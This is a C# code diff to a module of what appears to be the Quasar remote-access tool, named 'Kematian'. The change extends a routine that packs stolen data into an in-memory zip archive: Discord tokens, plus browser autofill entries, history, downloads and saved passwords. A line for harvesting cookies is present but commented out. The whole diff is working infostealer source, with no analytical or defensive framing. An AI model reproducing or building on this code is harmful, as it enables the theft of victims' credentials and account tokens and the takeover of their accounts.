@@ -3,7 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
-
+using Quasar.Client.Kematian.Browsers;
 
 
 namespace Quasar.Client.Kematian
@@ -16,26 +16,32 @@ namespace Quasar.Client.Kematian
             byte[] data = null;
             using (var memoryStream = new MemoryStream())
             {
-                // Create a ZipArchive in the memory stream
+                // make zip archive in mem stream
                 using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                 {
-                    var methods = new KeyValuePair<Func<string[]>, string>[]
+                    var retriever = new BrowsersRetriever();
+
+                    var methods = new KeyValuePair<Func<string>, string>[]
                     {
-                            new KeyValuePair<Func<string[]>, string>(GetTokens.Tokens, "tokens.txt"),
+                                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
+
+                                new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
+                                //new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
+
                     };
 
-                    // Example of how you might use the methods array
+                    // Process each method one at a time
                     foreach (var methodPair in methods)
                     {
-                        var entries = methodPair.Key();
-                        foreach (var entry in entries)
+                        var content = methodPair.Key();
+                        var zipEntry = archive.CreateEntry(methodPair.Value);
+                        using (var entryStream = zipEntry.Open())
+                        using (var streamWriter = new StreamWriter(entryStream))
                         {
-                            var zipEntry = archive.CreateEntry(methodPair.Value);
-                            using (var entryStream = zipEntry.Open())
-                            using (var streamWriter = new StreamWriter(entryStream))
-                            {
-                                streamWriter.Write(entry);
-                            }
+                            streamWriter.Write(content);
                         }
                     }
                 }
